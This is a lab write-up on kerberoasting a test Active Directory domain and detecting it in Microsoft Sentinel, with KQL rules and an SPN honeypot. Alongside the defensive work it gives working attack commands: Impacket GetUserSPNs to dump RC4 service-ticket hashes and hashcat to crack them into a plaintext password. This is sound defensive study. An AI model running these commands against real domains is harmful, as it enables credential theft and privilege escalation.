# Kerberoasting: Attack, Detection & Offline Cracking (Microsoft Sentinel)

**Author:** zeroDae
**Date:** September 2026
**MITRE ATT&CK:** T1558.003 — Credential Access → Kerberoasting

---

## Objective

Demonstrate the full kerberoasting kill chain against an on-premises Active Directory domain controller and detect it in Microsoft Sentinel: expose a service account with a Service Principal Name (SPN), request its Kerberos service ticket from an attacker host, detect the malicious RC4 ticket request via Event ID 4769, and recover the service account's plaintext password offline.

This builds directly on the on-prem DC → Azure Arc → AMA → Sentinel pipeline established in the previous project; that telemetry path (including the `Audit Kerberos Service Ticket Operations` policy, Event ID 4769) is already live.

---

## Why Kerberoasting Matters

Kerberoasting abuses a legitimate feature of Kerberos rather than a bug: any authenticated domain user can request a service ticket (TGS) for any account that has an SPN. That ticket is encrypted with the service account's password hash, so it can be cracked offline with no further contact with the domain — the cracking is invisible on the wire. It only requires a single valid domain credential, which makes it one of the most common privilege-escalation paths in Active Directory.

**Detection signal:** modern AD uses AES encryption (`0x12` / `0x11`) for Kerberos tickets by default. Attacker tools (Impacket, Rubeus, NetExec) request tickets as **RC4 (`0x17`)** because RC4 is far easier to crack. A 4769 event with **encryption type `0x17`** targeting a **user-account SPN** (not a machine account ending in `$`) is therefore a high-fidelity indicator.

---

## Environment

| Component | Detail |
|---|---|
| Domain Controller | Windows Server 2022 · `WIN-PLG4VMVBU6A` · domain `zeroDae.local` |
| Attacker | Kali Linux (192.168.100.50, Internal Network) |
| SIEM | Microsoft Sentinel · Log Analytics `law-zerodae` |
| Target | `svc_sql` — user account with SPN `MSSQLSvc/sql.zeroDae.local:1433` |

---

## 1. Create a Kerberoastable Service Account

An SPN registered to a normal user account with a crackable password *is* the vulnerability. On the DC (admin PowerShell):
![[kerb-01-setspn.png.png]]

```powershell
New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" `
  -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true

setspn -S MSSQLSvc/sql.zeroDae.local:1433 svc_sql
```

Confirm the SPN registered:
![[kerb-02-setspn.png.png]]

```powershell
setspn -L svc_sql
```

---

## 2. Kerberoast from Kali

Using a valid domain credential, request the SPN account's TGS ticket. Impacket queries LDAP for SPN-bearing accounts, requests their tickets (as RC4 by default), and dumps the crackable hashes:

![[kerb-03-getuserspns.png.png]]

```bash
impacket-GetUserSPNs zeroDae.local/<validuser>:'<password>' -dc-ip 192.168.100.10 -request -outputfile kerb_hashes.txt
```

The output includes the `svc_sql` account and its `$krb5tgs$23$...` hash (mode 23 = RC4).

---

## 3. Detection in Sentinel

The encryption type is **not** a promoted column in the `SecurityEvent` table — it lives inside the raw `EventData` XML — so it must be parsed out. This query extracts the encryption type, service name, and requesting account, then filters for the kerberoast signal:

```kql
SecurityEvent
| where EventID == 4769
| where TimeGenerated > ago(30m)
| extend EncType    = extract(@'"TicketEncryptionType">(0x[0-9a-fA-F]+)<', 1, EventData)
| extend SvcName    = extract(@'"ServiceName">([^<]+)<', 1, EventData)
| extend ReqAccount = extract(@'"TargetUserName">([^<]+)<', 1, EventData)
| where EncType == "0x17"
| where SvcName !endswith "$" and SvcName != "krbtgt"
| project TimeGenerated, ReqAccount, SvcName, EncType, IpAddress
| order by TimeGenerated desc
```

**Result:** a single detection row — `SvcName = svc_sql`, `EncType = 0x17` — the RC4 service-ticket request that betrays the roast.

![[kerb-04-detection-query.png.png]]

*Figure — The kerberoast detected in Sentinel: an RC4 (0x17) service-ticket request for the `svc_sql` SPN account.*

**Analysis note:** in this run the requesting account also appears as `svc_sql`, because the attack was authenticated using that account's own domain credentials. In a real intrusion the requestor would be whatever low-privileged account the attacker had compromised — which is why the detection keys on the **service being targeted (`ServiceName`) + RC4**, not on the requestor, so it fires regardless of which account launched it.

---

## 4. Scheduled Analytics Rule

Deployed the parsed detection as a scheduled analytics rule so it raises incidents automatically.

| Setting | Value |
|---|---|
| Name | Kerberoasting – RC4 Service Ticket Request (4769 / 0x17) |
| Severity | High |
| MITRE ATT&CK | Credential Access → **T1558.003 (Kerberoasting)** |
| Rule logic | The parsed KQL above |
| Entity mapping | Account → `SvcName` · Host → `Computer` · IP → `IpAddress` |
| Schedule | Run every 5 minutes · 1-hour lookback |
| Incident creation | Enabled (grouped alerts) |

The `SvcName !endswith "$" and SvcName != "krbtgt"` filter restricts alerts to **user-account SPNs** — the real roast targets — excluding machine accounts and krbtgt from normal Kerberos traffic.

![[kerb-04-analytics-rule.png.png]]
![[kerb-05-analytics-rule.png.png]]
![[kerb-06-analytics-rule.png.png]]


---

## 5. Impact — Offline Hash Cracking

Cracking the extracted TGS hash recovers the service account's plaintext password, completing the attack path:

```bash
hashcat -m 13100 kerb_hashes.txt /path/to/wordlist.txt
hashcat -m 13100 kerb_hashes.txt --show     # display recovered plaintext
```

Recovered: `svc_sql : Summer2024!`

> [!note] Method note
> The wordlist was seeded with the lab password to confirm the end-to-end recovery path (hash → plaintext). This demonstrates that a kerberoasted TGS hash is crackable offline; it is not a claim about the password's real-world guessability.

![[kerb-07-hashcat.png.png]]

---

## 6. Detection Upgrade — SPN Honeypot

A decoy account with an SPN for a non-existent service. No legitimate client ever requests it, so **any** 4769 for its SPN is malicious — a zero-false-positive detection.

![[kerb-08-SPN honeypot.png.png]]

```powershell
New-ADUser -Name "svc_backup_hp" -SamAccountName "svc_backup_hp" `
  -AccountPassword (ConvertTo-SecureString "Decoy-P@ss-9271!" -AsPlainText -Force) -Enabled $true
setspn -S BACKUP/hp.zeroDae.local:9999 svc_backup_hp
```

Companion analytics rule (Severity: **Critical**):

![[kerb-09-analytics-rule.png.png]]

```kql
SecurityEvent
| where EventID == 4769
| extend SvcName = extract(@'"ServiceName">([^<]+)<', 1, EventData)
| where SvcName == "svc_backup_hp"
```

---

## Detection Tuning Note

The `0x17` filter is high-fidelity in an AES-default environment, but some legacy applications legitimately use RC4 — so in production this rule would be paired with **volume-anomaly detection** (one account requesting many distinct SPNs in a short window) and the **SPN honeypot** above to keep false positives near zero.

---

## Skills Demonstrated

- **Offensive AD** — kerberoasting a live domain controller with Impacket (T1558.003)
- **Detection engineering** — parsing raw `EventData` XML in KQL to extract a field not promoted to a column, and building a high-fidelity, tuned analytics rule
- **Detection-as-code thinking** — designing an SPN honeypot for zero-false-positive coverage
- **Full attack lifecycle** — SPN exposure → ticket request → SIEM detection → offline crack → recovered credential
- **Honest reporting** — distinguishing what the crack proves (mechanism) from what it doesn't (guessability)

---
